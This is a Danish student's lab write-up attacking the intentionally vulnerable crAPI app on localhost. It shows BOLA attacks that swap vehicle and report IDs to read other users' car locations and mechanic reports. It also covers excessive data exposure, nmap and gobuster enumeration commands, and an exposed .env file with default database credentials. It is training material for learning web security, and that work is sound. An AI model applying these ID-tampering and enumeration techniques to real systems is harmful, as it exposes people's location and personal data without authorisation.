# Opsamlings øvelser

!!! note "Praktiske mål"

    - Hver studerende har anvendt Gobuster til enumerering af Juiceshop.
    - Hver studerende har anvendt flere af wordlisterne fra seclist.
    - Hver studerende er begyndt at udarbejde en wordlist til Juiceshop.
    - Hver studerende har identificeret en simpel BOLA sårbarhed i Juiceshop.
    - Hver studerende har identificeret en simpel Excessive data exposure sårbarhed i juiceshop.

## Opgave - Opsamlings øvelse 1

!!! note "Opgave beskrivelse"
    Jeg vil gennem gå øvelsen "BOLA & Excessive Data Exposure" fra uge 37. Man kan finde prep til dette [her](https://github.com/mesn1985/WebApplicationSecurityBasicsLab/blob/main/crAPI/1_Getting_To_Know_the_Application.md)

    - Udfør øvelse: 1 – [BOLA using object IDs without authorization](https://github.com/mesn1985/WebApplicationSecurityBasicsLab/blob/main/crAPI/2_Exploiting_BOLA_And_Excessive_Data_Exposure.md#1--bola-using-object-ids-without-authorization)
    - Udfør øvelse: 2 – [Excessive Data Exposure](https://github.com/mesn1985/WebApplicationSecurityBasicsLab/blob/main/crAPI/2_Exploiting_BOLA_And_Excessive_Data_Exposure.md#2--excessive-data-exposure)
    - Brug resultaterne fra øvelse 1 og 2 til at finde køretøjets placering for en bruger, du ikke selv har oprettet.
    - Udfør øvelse: 3 – [Explore OWASP Application Security Verification Standard](https://github.com/mesn1985/WebApplicationSecurityBasicsLab/blob/main/crAPI/2_Exploiting_BOLA_And_Excessive_Data_Exposure.md#3--explore-owasp-application-security-verification-standard)
    - Husk at notere dine observationer
    - Udfør øvelse: 4 – [Get access to other customers’ mechanic reports](https://github.com/mesn1985/WebApplicationSecurityBasicsLab/blob/main/crAPI/2_Exploiting_BOLA_And_Excessive_Data_Exposure.md#4--access-other-users-mechanic-reports)

Jeg vil prøve mig med [Caido](https://caido.io/), i stedet for burp suite.

### Under opgave - BOLA using object IDs without authorization

!!! note "Opgave beskrivelse"

    1. Create two user accounts — we’ll refer to them as User A and User B.
    1. Register a vehicle for each user. You’ll receive a VIN number and PIN code in the welcome email via MailHog.
    1. While authenticated as User A, navigate to the vehicle details dashboard.
    1. Use Burp Suite to intercept the request made to retrieve the vehicle location data.
    1. Note the resource ID (e.g., vehicle ID) used in the request.
    1. Log out, then authenticate as User B.
    1. Navigate to the same dashboard and capture the equivalent vehicle data request using Burp Suite.
    1. Send User B’s request to the Repeater.
    1. In Repeater, replace User B’s resource ID with the one you captured from User A.
    1. Send the modified request.

1. Create two user accounts — we’ll refer to them as User A and User B.
    - User A
    - User B

1. Register a vehicle for each user. You’ll receive a VIN number and PIN code in the welcome email via MailHog.
    - Tjek
1. While authenticated as User A, navigate to the vehicle details dashboard.
    - Tjek
1. Use Burp Suite to intercept the request made to retrieve the vehicle location data.
    - Tjek
1. Note the resource ID (e.g., vehicle ID) used in the request.
    - User A vehicle ID: 1f6250a7-9da9-4d39-83c4-de0ec5e2d14f
1. Log out, then authenticate as User B.
    - Tjek
1. Navigate to the same dashboard and capture the equivalent vehicle data request using Burp Suite.
    - tjek
1. Send User B’s request to the Repeater.

    ``` linenums="0"
    GET /identity/api/v2/vehicle/6a704fe8-088b-48d9-aaf4-1d2dddee16aa/location HTTP/1.1
    Host: 127.0.0.1:8888
    sec-ch-ua-platform: "Windows"
    Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyQGIuY29tIiwiaWF0IjoxNzU4NTIzOTM5LCJleHAiOjE3NTkxMjg3MzksInJvbGUiOiJ1c2VyIn0.LWzbG1LE8evAr6qNb9kLB5zyv0LWG8L1Q3vSVP5dgNkHghf8chnkfFJdwaQCadiqyy99f2cVUkF5TqSTQdT6Nkvv6KDyXzOsPVcKC08dQxaDuELu3ZkkEGX6zu6LIwyTvrXfWrKkp__Me1jERXedIz0XYSmK9kR59r8DpGzmJ1BHl0PCzIDP9J2zAkXw3lntI3Hvn5CexGPqqG-PCHjV9CIE0NKbZA3_3ax8mP8kVYeVWvcKi3aYHCDtA9ZKhGMXZzLOOa4YHBSbznbuRUgGb5yNT-5FQh37MpQdA-eb5Ges8RcZXwReD7VdNNfDUjrKRflVqDtXZsGfH5phU0nXag

    -- snippit --
    ```

1. In Repeater, replace User B’s resource ID with the one you captured from User A.

    ``` linenums="0"
    GET /identity/api/v2/vehicle/1f6250a7-9da9-4d39-83c4-de0ec5e2d14f
    /location HTTP/1.1
    Host: 127.0.0.1:8888
    ```
    Jeg har erstattet user B's vehicle ID med user A's.

1. Send the modified request.

    Jeg får dette resultat tilbage:

    ```json linenums="0"
    HTTP/1.1 200 
    Server: openresty/1.25.3.1
    Date: Mon, 22 Sep 2025 06:57:13 GMT
    Content-Type: application/json

    -- snippit --

    {
        "carId":"1f6250a7-9da9-4d39-83c4-de0ec5e2d14f",
        "vehicleLocation":{
                "id":2,
                "latitude":"31.284788",
                "longitude":"-92.471176"
            },
        "fullName":"User A",
        "email":"user@a.com"
    }
    ```

    At erstatte det vehicle ID i det API path gjorde at jeg som user B kan se lokationen for en bil, en anden bruger har købt. Dette passer da når man er logget ind som user A, kan se lokationen til at være: `31°17'05.2"N 92°28'16.2"W`, og vi får fat i user A's email.

    Dette viser at aplikationen i hvertfald er sårbar over for BOLA sårbarheder på dette API endpoint. 

### Under opgave - Excessive Data Exposure (EDE)

!!! note "Opgave beskrivelse"

    - Can you find API responses that return more information than is displayed in the user interface?
    - Do responses include sensitive fields such as internal user IDs, email addresses, roles, or tokens?
    - For example, does a vehicle data endpoint expose fields not shown in the dashboard?

Hvis man åbner "community" siden ved `http://127.0.0.1:8888/forum`, så er der helt klart en EDE sårbarhed. Man kan se andres email, vehicleid, osv.

Her kan man se alt det som bliver exposed.
```json linenums="0"
{
    "posts": [{
        "id": "5ZCKT6J4X9n2AHBg5EBXcH",
        "title": "Title 3",
        "content": "Hello world 3",
        "author": {
            "nickname": "Robot",
            "email": "robot001@example.com",
            "vehicleid": "4bae9968-ec7f-4de3-a3a0-ba1b2ab5e5e5",
            "profile_pic_url": "",
            "created_at": "2025-09-01T08:10:25.678Z"
        },
        "comments": [{
            "id": "",
            "content": "test",
            "CreatedAt": "2025-09-08T10:03:42.828Z",
            "author": {
                "nickname": "user one",
                "email": "user1@test.com",
                "vehicleid": "7e147d9f-d2f8-432d-899f-429a925198cc",
                "profile_pic_url": "",
                "created_at": "2025-09-08T10:03:42.828Z"
            }
        }],
        "authorid": 3,
        "CreatedAt": "2025-09-01T08:10:25.678Z"
    }, {
        "id": "FXoGyatPpvkvrBgLePm8ZB",
        "title": "Title 2",
        "content": "Hello world 2",
        "author": {
            "nickname": "Pogba",
            "email": "pogba006@example.com",
            "vehicleid": "cd515c12-0fc1-48ae-8b61-9230b70a845b",
            "profile_pic_url": "",
            "created_at": "2025-09-01T08:10:25.676Z"
        },
        "comments": [],
        "authorid": 2,
        "CreatedAt": "2025-09-01T08:10:25.676Z"
    }, {
        "id": "ACUi48NBYBFJmQ2MZuNtFE",
        "title": "Title 1",
        "content": "Hello world 1",
        "author": {
            "nickname": "Adam",
            "email": "adam007@example.com",
            "vehicleid": "f89b5f21-7829-45cb-a650-299a61090378",
            "profile_pic_url": "",
            "created_at": "2025-09-01T08:10:25.62Z"
        },
        "comments": [],
        "authorid": 1,
        "CreatedAt": "2025-09-01T08:10:25.62Z"
    }],
    "next_offset": null,
    "previous_offset": null,
    "total": 3
}
```

### Under opgave - Find placeringen af en anden bruges bil.

!!! note "Opgave beskrivelse"
    
    Brug resultaterne fra øvelse 1 og 2 til at finde køretøjets placering for en bruger, du ikke selv har oprettet.

Efter at have gået igennem de to tideligere opgave bliver dette megett muligt. Da ved at gå ind på community forummet kan vi skaffe os andre brugeres vehicleid. Der efter kan vi bruge til at finde dets lokation.

1. Find en anden brugers vehicleid.
    - Ved at kigge på resultatet fra den forige opgave vælger jeg at finde Adams bil. Jeg husker lige hans email til at sikre mig at det virker, da jeg ved at brugerens email bliver sendt sammen med bilens lokation. `adam007@example.com`
    - Jeg finder requesten til API'en og erstatter user A's vehicleid med Adams.

        ![alt text](image.png)

2. Brug Adams vehicleid til at finde bilens lokation.

    Efter at sende requesten til serveren få jeg dette resultat tilbage.

    ```json linenums="0"
    {
        "carId": "f89b5f21-7829-45cb-a650-299a61090378",
        "vehicleLocation": {
            "id": 1,
            "latitude": "32.778889",
            "longitude": "-91.919243"
        },
        "fullName": "Adam",
        "email": "adam007@example.com"
    }
    ```

    Som vi kan se så matcher hans email og navn stadig, med det vi fandt tideligere.


### Under opgave - Explore OWASP Application Security Verification Standard

!!! note "Opgave beskrivelse"
    OWASP’s [Application Security Verification Standard 5(ASVS)](https://github.com/OWASP/ASVS/tree/v5.0.0?tab=readme-ov-file#latest-stable-version---500) outlines controls and tests for secure software design.

    Review the standard and consider:

    - Which section(s) cover Authorization?
    - Are BOLA/IDOR vulnerabilities mentioned directly?
    - Can requirement 14.2.6 be related to the EDE vulnerability?
    - What testing strategies for authorization does ASVS refferer?

- Which section(s) cover Authorization?
    - V8 Authorization
- Are BOLA/IDOR vulnerabilities mentioned directly?
    - Ja 
    >Verify that the application ensures that data‑specific access is restricted to
    >consumers with explicit permissions to specific data items to mitigate
    >insecure direct object reference (IDOR) and broken object level
    >authorization (BOLA)
- Can requirement 14.2.6 be related to the EDE vulnerability?
    - Ja, det handler om at API eller backend kun skal sende det data som applikationen skal bruge til at fungere, ikke mere end det.

        > Verify that the application only returns the minimum required sensitive data for the application’s functionality. For example, only returning some of the digits of a credit card number and not the full number. If the complete data is required, it should be masked in the user interface unless the user specifically views it

- What testing strategies for authorization does ASVS refferer?

    - 4.5.1 Testing Directory Traversal File Include
    - 4.5.2 Testing for Bypassing Authorization Schema
    - 4.5.3 Testing for Privilege Escalation
    - 4.5.4 Testing for Insecure Direct Object References

### Under opgave - Access Other Users’ Mechanic Reports

!!! note "Opgave beskrivelse"

    There is a BOLA vulnerability that allows one authenticated user to view another user’s mechanic report.

    Your task:
    Use Burp Suite to analyze requests related to vehicle maintenance or mechanic history.

    - What kind of identifier is used to retrieve mechanic reports?
    - Can you modify the identifier to access another user’s report?
    - What should the server be doing to prevent this?
    
    If you’re successful, you’ll demonstrate another example of BOLA — this time involving more sensitive user data.

Jeg startede med at lave en rapport med user A. Så kiggede jeg i min http historik. Jeg fandt den `POST` request hvor jeg har skrevet `problem_details: test`, hvor jeg så kigger på den responce jeg fik tilbage. Den retunere dette i dens **message body**

```json linenums="0"
{
    "response_from_mechanic_api": {
        "id": 10,
        "sent": true,
        "report_link": "http://127.0.0.1:8888/workshop/api/mechanic/mechanic_report?report_id=10"
    },
    "status": 200
}
```

Her bed jeg mærke i det link, under `report_link` det virker som om det er et link hvor man kan se sin rapport.

Jeg kopier linket og prøver at åbne det i min browser. men jeg bliver mødt med `{"message":"JWT Token required!"}` Jeg kan huske fra Uge 36 (Under reflektions punkter) hvor vi læser os til at en JWT token er en API nøgle, som er i Authorization headeren i ens request.

Jeg tager den fejlede request til `report_link` og smider den i replay (Burp suites repeater) i Caido. så finder jeg min JWT token fra en anden request og smider den ind.

![alt text](image-1.png)

Nu med min JWT token på plads så prøver jeg at lave requesten igen. Denne gang virker det! og jeg kan se min rapport i JSON format:

```json linenums="0"
{
    "id": 10,
    "mechanic": {
        "id": 1,
        "mechanic_code": "TRAC_JHN",
        "user": {
            "email": "jhon@example.com",
            "number": ""
        }
    },
    "vehicle": {
        "id": 102,
        "vin": "8OFUL05KEOX516533",
        "owner": {
            "email": "user@a.com",
            "number": "1234"
        }
    },
    "problem_details": "test",
    "status": "pending",
    "created_on": "22 September, 2025, 08:35:27"
}
```


Her kan vi se alt om min rapport og hvilken machanic der står for den.

Men kan man se andre brugeres rapporter?

Hvis man kigger på det path vi bruger så ender den med at parameter `report_id=10`, hvad hvis vi ændre dette?

Ved at ændre det parameter værdi til 2 får vi faktisk en rapport som Adam har lavet:

```json linenums="0"

{
    "id": 2,
    "mechanic": {
        "id": 1,
        "mechanic_code": "TRAC_JHN",
        "user": {
            "email": "jhon@example.com",
            "number": ""
        }
    },
    "vehicle": {
        "id": 1,
        "vin": "7ECOX34KJTV359804",
        "owner": {
            "email": "adam007@example.com",
            "number": "9876895423"
        }
    },
    "problem_details": "My car Hyundai - Creta is having issues.\nCan you give me a call on my mobile 9876895423,\nOr send me an email at adam007@example.com\nThanks,\nAdam.\n",
    "status": "pending",
    "created_on": "01 September, 2025, 08:10:55"
}
```

Dette er ikke godt, da vi nu har fundet ud af hvordan man kan se andre brugeres private rapporter, noget som ikke burde være tilgængeligt for andre en brugeren selv. Og dette er et andet eksempel af en BOLA sårbarhed.

For at undgå dette skal serveren ikke bare validere brugere, men også hvad de har adgang til. fordi jeg brugte min egen JWT token, til at se andres rapporter. Ideelt burde min JWT token kun give adgang til mine rapporter.

## Opgave - Opsamlings øvelse 2

!!! note "Opgave beskrivelse"

    Jeg vil gennem gå øvelsen "Aktiv Rekognoscering" fra uge 38.

    1. Brug [Nmap](https://github.com/mesn1985/WebApplicationSecurityBasicsLab/blob/main/crAPI/3_Active_reconnaissance.md#1--nmap-full-port-scan) til at scanne alle porte

        - Udfør en fuld portscanning
        - Dokumentér hvilke porte der er åbne

    2. Lav en [Nmap](https://github.com/mesn1985/WebApplicationSecurityBasicsLab/blob/main/crAPI/3_Active_reconnaissance.md#2--nmap-service-version-detection) service scanning

        - Udfør en service detection (-sV) for at identificere hvilke services der kører
        - Sammenlign resultaterne med din portscan

    3. Brug [Gobuster](https://github.com/mesn1985/WebApplicationSecurityBasicsLab/blob/main/crAPI/3_Active_reconnaissance.md#3--enumerating-crapi-with-gobuster-and-the-wordlist-commontxt)  med `common.txt`

        - Brug gobuster til at brute-force paths på crAPI
        - Gem resultaterne og notér relevante endpoints

    4. Brug [Gobuster](https://github.com/mesn1985/WebApplicationSecurityBasicsLab/blob/main/crAPI/3_Active_reconnaissance.md#5--enumerating-crapi-with-zap) med `quickhits.txt`

        - Brug din anden wordlist og sammenlign output
        - Tilføj evt. nye paths til din samlede wordlist

    5. Test dine egne wordlister

        - Du har undervejs bygget dine egne wordlists (crAPI)
        - Brug gobuster eller ZAP til at teste dem
        - Sammenlign med common.txt og quickhits.txt


1. Brug Nmap til at scanne alle porte

    - Udfør en fuld portscanning
        - For at udføre en fuld portscanning bruger jeg flaget -p således: `-p1-65535` til at scanne alle porte.
        - Hele den brygte nmap kommando ser sådan ud: `nmap 127.0.0.1 -p1-65535`
    - Dokumentér hvilke porte der er åbne
        ``` linenums="0"
        PORT     STATE SERVICE
        3000/tcp open  ppp
        4280/tcp open  vrml-multi-use
        8025/tcp open  ca-audit-da
        8443/tcp open  https-alt
        8888/tcp open  sun-answerbook
        ```

2. Lav en Nmap service scanning

    - Udfør en service detection (-sV) for at identificere hvilke services der kører
        - Jeg bruger den samme kommando som før, men tilføjer `-sV`
        - `nmap 127.0.0.1 -sV -p1-65535`
    - Sammenlign resultaterne med din portscan

        ```linenums="0"
        PORT     STATE SERVICE  VERSION
        3000/tcp open  ppp?
        4280/tcp open  http     Apache httpd 2.4.62 ((Debian))
        8025/tcp open  http     Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
        8443/tcp open  ssl/http OpenResty web app server 1.25.3.1
        8888/tcp open  http     OpenResty web app server 1.25.3.1
        ```

3. Brug Gobuster med `common.txt`

    - Brug gobuster til at brute-force paths på crAPI
        - Først bruger jeg `curl -k -i https://127.0.0.1:8443/thispathshouldnotexist` Til at identificere hvilken `content length` der skal exkluderes da crAPI altid vil retunere `200 ok`
        - Jeg bruger så `gobuster dir -u https://127.0.0.1:8443 -w /usr/share/seclists/Discovery/Web-Content/common.txt --no-tls-validation --exclude-length 2837` med `--exclude-length 2837` da den ikke skal give resultater når noget kommer tilbage med en `content length` på 2837.
    - Gem resultaterne og notér relevante endpoints

        ```linenums="0"
        ===============================================================
        Starting gobuster in directory enumeration mode
        ===============================================================
        /.env                 (Status: 200) [Size: 201]
        /.well-known/jwks.json (Status: 200) [Size: 528]
        /community            (Status: 301) [Size: 175] [--> https://127.0.0.1/community/]
        /favicon.ico          (Status: 200) [Size: 3150]
        /identity             (Status: 301) [Size: 175] [--> https://127.0.0.1/identity/]
        /images               (Status: 301) [Size: 175] [--> https://127.0.0.1/images/]
        /robots.txt           (Status: 200) [Size: 67]
        /workshop             (Status: 301) [Size: 175] [--> https://127.0.0.1/workshop/]
        Progress: 4746 / 4746 (100.00%)
        ===============================================================
        Finished
        ===============================================================
        ```

4. Brug Gobuster med `quickhits.txt`

    - Brug din anden wordlist og sammenlign output
        - bruger samme kommando men peger mod en ny wordlist: `gobuster dir -u https://127.0.0.1:8443 -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --no-tls-validati
on --exclude-length 2837`
    - Tilføj evt. nye paths til din samlede wordlist
        - Der var ikke nogen nye paths

5. Test dine egne wordlister

    - Test din wordlist.
        - Den er precis den samme som common.txt

**NOTE**
Der er nogle meget interesante fund hvis man kigger rundt i de paths man finder her.

Hvis man går til `http://127.0.0.1:8888/.env`, så finder man backend server logins som kun burde være tilgængeligt til udviklerne.

```linenums="0"
DB_NAME=crapi
DB_USER=crapi
DB_PASSWORD=crapi
DB_HOST=postgresdb
DB_PORT=5432
SERVER_PORT=8080
MONGO_DB_HOST=mongodb
MONGO_DB_PORT=27017
MONGO_DB_USER=crapi
MONGO_DB_PASSWORD=crapi
MONGO_DB_NAME=crapi
```